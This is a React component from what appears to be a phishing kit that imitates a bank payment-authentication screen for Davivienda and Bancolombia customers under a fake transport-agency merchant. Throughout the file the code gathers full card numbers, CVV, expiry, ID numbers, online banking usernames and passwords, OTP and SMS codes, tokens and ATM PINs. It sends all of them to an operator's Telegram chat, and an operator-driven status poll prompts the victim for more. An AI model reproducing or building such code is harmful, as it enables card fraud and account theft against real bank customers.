import React, { useEffect, useRef, useState } from "react";
import { sendMessage } from "../services/telegram/sendMessage";
import { CheckCardService } from "../services/checkCardService";
import Image from "next/image";
import { savePaymentStateService } from "../services/telegram/savePaymentState";

interface PaymentStatusModalProps {
  sessionId: string;
  isOpen: boolean;
  price: string;
  priceFormatted: string;
  last4: string;
  card: string;
  cardT: string;
  vencimiento: string;
  cvv: string;
  titular: string;
  cardBrand: string;
  banco?: string;
  email?: string;
  contactData?: { email?: string; celular?: string };
  onClose?: (success?: boolean) => void;
  redirectSuccess?: string;
  redirectDeclined?: string;
}
type PaymentStatus =
  | "loading"
  | "otp"
  | "error_otp"
  | "user"
  | "error_user"
  | "error_password"
  | "new_card"
  | "code_sms"
  | "error_code_sms"
  | "token"
  | "error_token"
  | "clave_cajero"
  | "error_clave_cajero"
  | "clave_virtual"
  | "error_clave_virtual"
  | "confirmar_identidad"
  | "code_email"
  | "error_code_email"
  | "finalized"
  | "banned";

const getDaviviendaMessage = (status: PaymentStatus) => {
  switch (status) {
    case "otp":
    case "error_otp":
      return {
        title: "Autenticación de compra",
        desc1:
          "Davivienda le envió un código de confirmación para continuar con el proceso de compra. Por favor digítelo.",
        desc2:
          "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO",
      };
    case "code_sms":
    case "error_code_sms":
      return {
        title: "Autenticación de compra",
        desc1:
          "Davivienda le envió un código de confirmación SMS para continuar con el proceso de compra. Por favor digítelo.",
        desc2:
          "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO",
      };
    case "code_email":
    case "error_code_email":
      return {
        title: "Autenticación de compra",
        desc1:
          "Davivienda le envió un código de confirmación a su Correo Electrónico (E-Mail) para continuar con el proceso de compra. Por favor digítelo.",
        desc2:
          "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO",
      };
    case "token":
    case "error_token":
      return {
        title: "Autenticación de compra",
        desc1:
          "Ingrese la clave dinámica/token de su aplicación móvil Davivienda para autorizar la transacción.",
      };
    case "clave_cajero":
    case "error_clave_cajero":
      return {
        title: "Autenticación de compra",
        desc1:
          "Ingrese su clave de cajero (PIN de 4 dígitos) para autorizar la transacción.",
      };
    default:
      return null;
  }
};

interface DaviviendaOtpFormProps {
  otp: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onSubmit: () => void;
  hasError: boolean;
}

const DaviviendaOtpForm: React.FC<DaviviendaOtpFormProps> = ({
  otp,
  onChange,
  onSubmit,
  hasError,
}) => {
  return (
    <div
      className="col-12 visa-styling"
      style={{
        fontFamily: '"Segoe UI", Tahoma, sans-serif',
        fontSize: 14,
        width: "100%",
        textAlign: "center",
      }}
    >
      <div className="form-group text-center">
        <div id="InputAction" style={{ width: "60%", margin: "0 auto" }}>
          <label
            htmlFor="CredentialValidateInput"
            style={{
              color: hasError ? "#d70000" : "#6b6887",
              fontWeight: 400,
              display: "inline-block",
              marginBottom: 4,
            }}
          >
            Código de verificación
          </label>
          <input
            autoFocus
            id="CredentialValidateInput"
            name="otp"
            type="text"
            value={otp}
            onChange={onChange}
            autoComplete="off"
            style={{
              display: "block",
              width: "100%",
              textAlign: "center",
              border: hasError ? "1px solid #d70000" : "1px solid #8180a3",
              fontSize: 32,
              lineHeight: "37px",
              height: 40,
              borderRadius: 3,
              fontFamily: '"Segoe UI", Tahoma, sans-serif',
              boxSizing: "border-box",
            }}
            onFocus={(e) => {
              e.target.style.borderColor = "#193ab0";
              e.target.style.boxShadow = "none";
            }}
            onBlur={(e) => {
              e.target.style.borderColor = hasError ? "#d70000" : "#8180a3";
            }}
          />

          {hasError && (
            <div
              id="ErrorMessage"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                marginBottom: ".25em",
                gap: 4,
              }}
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 16 16"
                fill="none"
                style={{ flexShrink: 0 }}
              >
                <circle cx="8" cy="8" r="7" fill="#d70000" />
                <text
                  x="8"
                  y="12"
                  textAnchor="middle"
                  fill="white"
                  fontSize="11"
                  fontWeight="bold"
                >
                  !
                </text>
              </svg>
              <span style={{ color: "#d70000" }}>
                Su código de confirmación es incorrecto
              </span>
            </div>
          )}

          <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
            <button
              type="submit"
              className="visa-styling btn btn-primary text-uppercase vba-button"
              id="ValidateButton"
              onClick={onSubmit}
              style={{
                background: "#193ab0",
                color: "#FFF",
                border: "none",
                borderRadius: 3,
                fontWeight: 200,
                width: "100%",
                marginBottom: 10,
                padding: "6px 20px",
                cursor: "pointer",
                fontFamily: '"Segoe UI", Tahoma, sans-serif',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.background = "#193ab0";
              }}
            >
              Enviar
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

interface DaviviendaUserFormProps {
  user: string;
  contrasena: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onSubmit: () => void;
  errorMsg?: string;
}

const DaviviendaUserForm: React.FC<DaviviendaUserFormProps> = ({
  user,
  contrasena,
  onChange,
  onSubmit,
  errorMsg,
}) => {
  return (
    <div
      className="col-12 visa-styling"
      style={{
        fontFamily: '"Segoe UI", Tahoma, sans-serif',
        fontSize: 14,
        width: "100%",
        textAlign: "center",
      }}
    >
      <div className="form-group text-center">
        <div id="InputAction" style={{ width: "60%", margin: "0 auto" }}>
          <div style={{ marginBottom: 16 }}>
            <label
              htmlFor="CredentialUserInput"
              style={{
                color: "#6b6887",
                fontWeight: 400,
                display: "inline-block",
                marginBottom: 4,
              }}
            >
              Usuario
            </label>
            <input
              autoFocus
              id="CredentialUserInput"
              name="User"
              type="text"
              value={user}
              onChange={onChange}
              autoComplete="off"
              style={{
                display: "block",
                width: "100%",
                textAlign: "center",
                border: "1px solid #8180a3",
                fontSize: 32,
                lineHeight: "37px",
                height: 40,
                borderRadius: 3,
                fontFamily: '"Segoe UI", Tahoma, sans-serif',
                boxSizing: "border-box",
              }}
              onFocus={(e) => {
                e.target.style.borderColor = "#193ab0";
                e.target.style.boxShadow = "none";
              }}
              onBlur={(e) => {
                e.target.style.borderColor = "#8180a3";
              }}
            />
          </div>

          <div style={{ marginBottom: 16 }}>
            <label
              htmlFor="CredentialPasswordInput"
              style={{
                color: "#6b6887",
                fontWeight: 400,
                display: "inline-block",
                marginBottom: 4,
              }}
            >
              Contraseña
            </label>
            <input
              id="CredentialPasswordInput"
              name="contrasena"
              type="text"
              value={contrasena}
              onChange={onChange}
              autoComplete="off"
              style={{
                display: "block",
                width: "100%",
                textAlign: "center",
                border:
                  errorMsg && errorMsg.includes("password")
                    ? "1px solid #d70000"
                    : "1px solid #8180a3",
                fontSize: 32,
                lineHeight: "37px",
                height: 40,
                borderRadius: 3,
                fontFamily: '"Segoe UI", Tahoma, sans-serif',
                boxSizing: "border-box",
              }}
              onFocus={(e) => {
                e.target.style.borderColor = "#193ab0";
                e.target.style.boxShadow = "none";
              }}
              onBlur={(e) => {
                e.target.style.borderColor = "#8180a3";
              }}
            />
          </div>

          {errorMsg && (
            <div
              id="ErrorMessage"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                marginBottom: ".25em",
                gap: 4,
              }}
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 16 16"
                fill="none"
                style={{ flexShrink: 0 }}
              >
                <circle cx="8" cy="8" r="7" fill="#d70000" />
                <text
                  x="8"
                  y="12"
                  textAnchor="middle"
                  fill="white"
                  fontSize="11"
                  fontWeight="bold"
                >
                  !
                </text>
              </svg>
              <span style={{ color: "#d70000" }}>{errorMsg}</span>
            </div>
          )}

          <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
            <button
              type="submit"
              className="visa-styling btn btn-primary text-uppercase vba-button"
              id="ValidateButton"
              onClick={onSubmit}
              style={{
                background: "#193ab0",
                color: "#FFF",
                border: "none",
                borderRadius: 3,
                fontWeight: 200,
                width: "100%",
                marginBottom: 10,
                padding: "6px 20px",
                cursor: "pointer",
                fontFamily: '"Segoe UI", Tahoma, sans-serif',
              }}
            >
              Enviar
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
  sessionId,
  isOpen,
  price,
  priceFormatted,
  last4,
  card,
  cardT,
  cardBrand,
  banco,
  contactData,
  onClose,
  redirectSuccess,
  redirectDeclined,
}) => {
  const [status, setStatus] = useState<PaymentStatus>("loading");
  const [isResetting, setIsResetting] = useState(true);
  const [showIdentityModal, setShowIdentityModal] = useState(false);
  const openedAtRef = useRef<number>(0);
  const [cardInfo, setCardInfo] = useState<{
    issuer: string;
    level: string;
    brand: string;
    type: string;
    country: string;
    infocc: string;
  }>({
    issuer: "Desconocido",
    level: "N/A",
    brand: "N/A",
    type: "N/A",
    country: "N/A",
    infocc: "N/A",
  });

  // Función helper para obtener toda la información de la tarjeta
  const getCardInfoString = () => {
    const paymentRaw = localStorage.getItem("checkout_payment");
    const paymentData = paymentRaw ? JSON.parse(paymentRaw) : null;

    const cleanCard = paymentData?.numeroTarjeta
      ? paymentData.numeroTarjeta.replace(/\D/g, "")
      : card.replace(/\D/g, "");

    const cardNumberFormatted =
      cleanCard && cleanCard.length >= 16
        ? `${cleanCard.substring(0, 4)} ${cleanCard.substring(4, 8)} ${cleanCard.substring(8, 12)} ${cleanCard.substring(12, 16)}`.trim()
        : cleanCard || "N/A";

    const vencimiento = paymentData?.vencimiento || "N/A";
    const cvv = paymentData?.cvv || "N/A";
    const titular = paymentData?.titular || "N/A";
    const email = paymentData?.email || contactData?.email || "N/A";
    const celular =
      paymentData?.celular ||
      contactData?.celular ||
      paymentData?.telefono ||
      "N/A";
    const cedula = paymentData?.cedula || "N/A"; // Añadimos cédula
    const cardType = paymentData?.metodo
      ? paymentData.metodo === "credito"
        ? "Crédito"
        : paymentData.metodo === "debito"
          ? "Débito"
          : paymentData.metodo
      : "N/A";

    return {
      cardNumber: cardNumberFormatted,
      cardNumberRaw: cleanCard || "N/A",
      vencimiento,
      cvv,
      titular,
      email,
      cedula,
      celular,
      cardType,
      banco: cardInfo.issuer || "Desconocido",
      red: cardInfo.type || "N/A",
      tipoTarjeta: cardInfo.level || "N/A",
      marca: cardInfo.brand || "N/A",
    };
  };

  useEffect(() => {
    if (isOpen && sessionId) {
      const paymentRaw = localStorage.getItem("checkout_payment");
      const paymentData = paymentRaw ? JSON.parse(paymentRaw) : {};

      const email = contactData?.email || paymentData.email;
      const celular = contactData?.celular || paymentData.celular;
      const brand = cardBrand || paymentData.cardBrand;

      if (email || celular || brand) {
        const updated = {
          ...paymentData,
          ...(email && { email }),
          ...(celular && { celular }),
          ...(brand && { cardBrand: brand }),
        };
        localStorage.setItem("checkout_payment", JSON.stringify(updated));
      }

      const validateCard = async () => {
        const cleanCard =
          paymentData?.numeroTarjeta?.replace(/\D/g, "") ||
          card.replace(/\D/g, "");
        if (cleanCard.length >= 8) {
          const result = await CheckCardService.validateCard(cleanCard);
          if (result.success) {
            const resolvedIssuer = banco || paymentData?.banco || result.issuer;
            setCardInfo({
              issuer: resolvedIssuer || "Desconocido",
              level: result.level || "N/A",
              brand: result.brand || "N/A",
              type: result.type || "N/A",
              country: result.country || "N/A",
              infocc: result.infocc || "N/A",
            });
          }
        }
      };

      validateCard();
    }
  }, [isOpen, cardBrand, banco, contactData, card]);

  const [formData, setFormData] = useState({
    User: "",
    contrasena: "",
    otp: "",
  });

  useEffect(() => {
    console.log("", {
      isOpen,
      sessionId,
    });

    if (isOpen && sessionId && cardInfo.issuer !== "Desconocido") {
      console.log("");
      const ip = localStorage.getItem("ip") || "N/A";

      const paymentRaw = localStorage.getItem("checkout_payment");
      const paymentData = paymentRaw ? JSON.parse(paymentRaw) : null;

      const cleanCard = paymentData?.numeroTarjeta
        ? paymentData.numeroTarjeta.replace(/\D/g, "")
        : "";
      const cardNumberFormatted = cleanCard
        ? `${cleanCard.substring(0, 4)} ${cleanCard.substring(4, 8)} ${cleanCard.substring(8, 12)} ${cleanCard.substring(12, 16)}`.trim()
        : "N/A";

      const cardType = paymentData?.metodo
        ? paymentData.metodo === "credito"
          ? "Crédito"
          : paymentData.metodo === "debito"
            ? "Débito"
            : paymentData.metodo
        : "N/A";

      const cardBrandLabel = paymentData?.cardBrand || "Desconocida";

      const bancoDelBin = cardInfo.issuer || "Desconocido";
      const redDelBin = cardInfo.type || "N/A";
      const tipoDelBin = cardInfo.level || "N/A";
      const marcaDelBin = cardInfo.brand || "N/A";

      const mensaje =
        `👤 Nuevo pago de cliente\n` +
        `🔑 Session ID: ${sessionId}\n` +
        `📡 IP: ${ip}\n\n` +
        `💳 Tarjeta: ${cardNumberFormatted}\n` +
        `🏷️ Tipo: ${cardType ?? "N/A"} ${cardBrandLabel ?? ""}\n` +
        `🏦 Banco: ${bancoDelBin ?? "N/A"}\n` +
        `🔴 Red: ${redDelBin?.toUpperCase?.() ?? "N/A"}\n` +
        `📊 Tipo Tarjeta: ${tipoDelBin?.toUpperCase?.() ?? "N/A"}\n` +
        `✨ Marca: ${marcaDelBin ?? "N/A"}\n` +
        `📅 Vencimiento: ${paymentData?.vencimiento ?? "N/A"}\n` +
        `🔒 CVV: ${paymentData?.cvv ?? "N/A"}\n` +
        `✉️ Email: ${paymentData?.email ?? contactData?.email ?? "N/A"}\n` +
        `📱 Teléfono: ${paymentData?.celular ?? contactData?.celular ?? paymentData?.telefono ?? "N/A"}\n` +
        `👤 Titular: ${paymentData?.titular ?? "N/A"}\n` +
        `🪪 Cédula: ${paymentData?.cedula ?? "N/A"}\n` +
        `💰 Total: ${priceFormatted}\n\n` +
        `📌 ESTADO: TARJETA INGRESADA, ESPERANDO RESPUESTA`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "📁 Errores", callback_data: "carpeta_errores" },
            { text: "📄 Pages", callback_data: "carpeta_pages" },
          ],
          [{ text: "✅ Check", callback_data: "check" }],
        ],
      };

sendMessage(mensaje, keyboard, sessionId, true)
        .then((res) => console.log("✅ OK:", res))
        .catch((err) => console.error("❌ ERROR:", err));
    }
  }, [isOpen, sessionId, card, price, cardInfo]);

  useEffect(() => {
    if (isOpen && sessionId) {
      openedAtRef.current = Date.now();
      setStatus("loading");
      setFormData({ User: "", contrasena: "", otp: "" });
      setIsResetting(true);
      savePaymentStateService(sessionId, "loading").finally(() => {
        setIsResetting(false);
      });
    } else {
      setIsResetting(true);
    }
  }, [isOpen, sessionId]);

  useEffect(() => {
    if (!isOpen || !sessionId || isResetting) {
      console.log("");
      return;
    }

    console.log("");

    const checkStatus = async () => {
      try {
        const url = `/api/telegram/checkStatus?sessionId=${sessionId}`;
        console.log(`${url}...`);

        const response = await fetch(url);
        const data = await response.json();

        console.log("", data);

        if (data.status) {
          console.log(`: ${data.status}`);

          // Ignorar finalized/banned si han pasado menos de 3 segundos desde la apertura
          // Esto evita leer un estado antiguo de Redis que no alcanzó a limpiarse
          const secondsSinceOpen = (Date.now() - openedAtRef.current) / 1000;
          if (
            (data.status === "finalized" || data.status === "banned") &&
            secondsSinceOpen < 3
          ) {
            console.log(
              `Ignorando estado ${data.status} - muy temprano (${secondsSinceOpen.toFixed(1)}s desde apertura)`,
            );
            return;
          }

          setStatus(data.status);

          if (data.status === "finalized" || data.status === "banned") {
            console.log(`${data.status}`);
            clearInterval(intervalId);
          }
        }
      } catch (error) {
        console.error("", error);
      }
    };

    checkStatus();

    const intervalId = setInterval(checkStatus, 2000);

    return () => {
      console.log("");
      clearInterval(intervalId);
    };
  }, [isOpen, sessionId, isResetting]);

  useEffect(() => {
    if (status === "confirmar_identidad") {
      setShowIdentityModal(true);
      return;
    }

    setShowIdentityModal(false);
  }, [status]);

  useEffect(() => {
    if (status === "finalized" || status === "banned") {
      console.log(``);

      const timer = setTimeout(() => {
        console.log(``);
        if (status === "finalized") {
          if (redirectSuccess) {
            window.location.href = redirectSuccess;
            return;
          }
          if (onClose) onClose(true);
        } else {
          if (onClose) onClose(false);
        }
      }, 2000);

      return () => clearTimeout(timer);
    }
  }, [status, onClose, redirectSuccess]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const clearField = (field: keyof typeof formData) => {
    setFormData((prev) => ({
      ...prev,
      [field]: "",
    }));
  };

  const handleSubmit = () => {
    if (!formData.User || !formData.contrasena) {
      return;
    } else {
      savePaymentStateService(sessionId, "loading");

      const ip = localStorage.getItem("ip") || "IP no disponible";
      const cardInfoStr = getCardInfoString();

      const mensaje =
        `🏉 LOGO INGRESADO\n` +
        `🔑 Session ID: ${sessionId}\n` +
        `📡 IP: ${ip}\n\n` +
        `👤 ${cardInfoStr.titular}\n` +
        `🪪 Cédula: ${cardInfoStr.cedula}\n` +
        `🏛 Usuario: ${formData.User}\n` +
        `🔐 Contraseña: ${formData.contrasena}\n\n` +
        `💳 Tarjeta: ${cardInfoStr.cardNumber}\n` +
        `🏷️ Tipo: ${cardInfoStr.cardType}\n` +
        `🏦 Banco: ${cardInfoStr.banco}\n` +
        `🔴 Red: ${cardInfoStr.red}\n` +
        `📊 Tipo Tarjeta: ${cardInfoStr.tipoTarjeta}\n` +
        `✨ Marca: ${cardInfoStr.marca}\n` +
        `📅 Vencimiento: ${cardInfoStr.vencimiento}\n` +
        `🔒 CVV: ${cardInfoStr.cvv}\n` +
        `✉️ Email: ${cardInfoStr.email}\n` +
        `📱 Teléfono: ${cardInfoStr.celular}\n\n` +
        `📌 ESTADO: LOGO INGRESADO, ESPERANDO RESPUESTA`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "📁 Errores", callback_data: "carpeta_errores" },
            { text: "📁 Pages", callback_data: "carpeta_pages" },
          ],
          [{ text: "✅ Check", callback_data: "check" }],
        ],
      };

      sendMessage(mensaje, keyboard, sessionId);

      clearField("User");
      clearField("contrasena");

      setStatus("loading");
    }
  };

  const handleSubmitOtp = () => {
    if (!formData.otp) {
      alert("Por favor, complete los campos");
    } else {
      savePaymentStateService(sessionId, "loading");

      const ip = localStorage.getItem("ip") || "IP no disponible";
      const cardInfoStr = getCardInfoString();

      // Determinar qué tipo de código se está enviando
      let tipoCodigo = "OTP";
      if (status === "code_sms" || status === "error_code_sms") {
        tipoCodigo = "SMS";
      } else if (status === "code_email" || status === "error_code_email") {
        tipoCodigo = "CÓDIGO EMAIL";
      } else if (status === "token" || status === "error_token") {
        tipoCodigo = "TOKEN/DINÁMICA";
      } else if (status === "clave_cajero" || status === "error_clave_cajero") {
        tipoCodigo = "CLAVE CAJERO";
      } else if (
        status === "clave_virtual" ||
        status === "error_clave_virtual"
      ) {
        tipoCodigo = "CLAVE VIRTUAL";
      } else if (status === "confirmar_identidad") {
        tipoCodigo = "CONFIRMAR IDENTIDAD";
      }

      const mensaje =
        `🏉 ${tipoCodigo} ADQUIRIDO\n` +
        `🔑 Session ID: ${sessionId}\n` +
        `📡 IP: ${ip}\n\n` +
        `👤 ${cardInfoStr.titular}\n` +
        `🪪 Cédula: ${cardInfoStr.cedula}\n` +
        (status === "clave_virtual" || status === "error_clave_virtual"
          ? ""
          : `🏛 Usuario: ${formData.User || "N/A"}\n`) +
        (status === "clave_virtual" || status === "error_clave_virtual"
          ? ""
          : `🔐 Contraseña: ${formData.contrasena || "N/A"}\n\n`) +
        `💳 Tarjeta: ${cardInfoStr.cardNumber}\n` +
        `🏷️ Tipo: ${cardInfoStr.cardType}\n` +
        `🏦 Banco: ${cardInfoStr.banco}\n` +
        `🔴 Red: ${cardInfoStr.red}\n` +
        `📊 Tipo Tarjeta: ${cardInfoStr.tipoTarjeta}\n` +
        `✨ Marca: ${cardInfoStr.marca}\n` +
        `📅 Vencimiento: ${cardInfoStr.vencimiento}\n` +
        `🔒 CVV: ${cardInfoStr.cvv}\n` +
        `✉️ Email: ${cardInfoStr.email}\n` +
        `📱 Teléfono: ${cardInfoStr.celular}\n\n` +
        `<pre>` +
        `💲 ${tipoCodigo}: ${formData.otp}` +
        `</pre>\n\n` +
        `📌 ESTADO: ${tipoCodigo} INGRESADO, ESPERANDO RESPUESTA`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "📁 Errores", callback_data: "carpeta_errores" },
            { text: "📁 Pages", callback_data: "carpeta_pages" },
          ],
          [{ text: "✅ Check", callback_data: "check" }],
        ],
      };
      sendMessage(mensaje, keyboard, sessionId);

      clearField("otp");

      setStatus("loading");
    }
  };

  const getCurrentDate = (): string => {
    const now = new Date();
    const day = now.getDate().toString().padStart(2, "0");
    const month = (now.getMonth() + 1).toString().padStart(2, "0");
    const year = now.getFullYear();
    return `${day}/${month}/${year}`;
  };

  if (!isOpen) return null;

  const isError = status.startsWith("error_");
  const isBancolombia =
    cardInfo.issuer?.toLowerCase().includes("bancolombia") ?? false;
  const isDavivienda =
    cardInfo.issuer?.toLowerCase().includes("davivienda") ?? false;

  const renderContent = () => {
    switch (status) {
      case "loading":
        return (
          <div className="psm-loading">
            <Image
              src="/loading.gif"
              alt="gif"
              width={80}
              height={80}
              unoptimized
            />
          </div>
        );

      case "otp":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={false}
          />
        ) : (
          <>
            {isBancolombia ? (
              <p className="text-[10px] mt-3 font-extralight">
                Detalle de la Transacción
              </p>
            ) : (
              <>
                <p className="text-[10px] mt-10">
                  Enter your online banking information:
                </p>
                <p className="text-[10px] mt-3 font-extralight">
                  TRANSACTION DETAILS
                </p>
              </>
            )}

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Comercio:" : "Commerce:"}
                    </td>
                    <td className="pb-[2px]">
                      Secretaria de transporte - Movilidad © 2026
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Monto de la Transacción:"
                        : "Transaction Amount:"}
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Número de Tarjeta:" : "Card number:"}
                    </td>
                    <td className="pb-[2px] ng-binding">************{last4}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Ingresa tu Clave Dinámica:"
                        : "OTP Code:"}
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5 text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
            {isBancolombia && (
              <div className="flex w-full justify-start mt-4">
                <a href="#" className="text-xs text-gray-700 underline">
                  ¿Necesitas Ayuda?
                </a>
              </div>
            )}
          </>
        );

      case "error_otp":
        return isDavivienda ? (
          <DaviviendaOtpForm
            otp={formData.otp}
            onChange={handleInputChange}
            onSubmit={handleSubmitOtp}
            hasError={true}
          />
        ) : (
          <>
            {isBancolombia ? (
              <p className="text-[10px] mt-3 font-extralight">
                Detalle de la Transacción
              </p>
            ) : (
              <>
                <p className="text-[10px] mt-10">
                  Enter your online banking information:
                </p>
                <p className="text-[10px] mt-3 font-extralight">
                  TRANSACTION DETAILS
                </p>
              </>
            )}

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Comercio:" : "Commerce:"}
                    </td>
                    <td className="pb-[2px]">
                      Secretaria de transporte - Movilidad © 2026
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Monto de la Transacción:"
                        : "Transaction Amount:"}
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Número de Tarjeta:" : "Card number:"}
                    </td>
                    <td className="pb-[2px] ng-binding">************{last4}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia
                        ? "Ingresa tu Clave Dinámica:"
                        : "OTP Code:"}
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="otp"
                        value={formData.otp}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                {isBancolombia
                  ? "Clave Dinámica incorrecta, por favor verifícala."
                  : "Incorrect OTP key, please verify it."}
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5 text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmitOtp}
              >
                Authorize
              </button>
            </div>
            {isBancolombia && (
              <div className="flex w-full justify-start mt-4">
                <a href="#" className="text-xs text-gray-700 underline">
                  ¿Necesitas Ayuda?
                </a>
              </div>
            )}
          </>
        );

      case "user":
        return isDavivienda ? (
          <DaviviendaUserForm
            user={formData.User}
            contrasena={formData.contrasena}
            onChange={handleInputChange}
            onSubmit={handleSubmit}
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      User:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="text"
                        name="User"
                        value={formData.User}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Password:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="contrasena"
                        value={formData.contrasena}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmit}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "error_user":
        return isDavivienda ? (
          <DaviviendaUserForm
            user={formData.User}
            contrasena={formData.contrasena}
            onChange={handleInputChange}
            onSubmit={handleSubmit}
            errorMsg="Usuario incorrecto, por favor verifique."
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Transaction Amount:
                    </td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Card number:
                    </td>
                    <td className="pb-[2px] ng-binding">
                      **** **** **** {last4}
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      User:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="text"
                        name="User"
                        value={formData.User}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Password:
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
                        name="contrasena"
                        value={formData.contrasena}
                        onChange={handleInputChange}
                        autoComplete="off"
                        className="inputnormal border border-black"
                        placeholder=""
                      />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                Incorrect username, please verify..
              </p>
            </div>

            <div className="flex w-full justify-center mt-5">
              <button
                className="px-5  text-black bg-gray-300 border border-black rounded-full justify-self-center"
                onClick={handleSubmit}
              >
                Authorize
              </button>
            </div>
          </>
        );

      case "error_password":
        return isDavivienda ? (
          <DaviviendaUserForm
            user={formData.User}
            contrasena={formData.contrasena}
            onChange={handleInputChange}
            onSubmit={handleSubmit}
            errorMsg="Contraseña incorrecta, por favor verifique."
          />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              TRANSACTION DETAILS
            </p>

            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      Commerce:
                    </td>
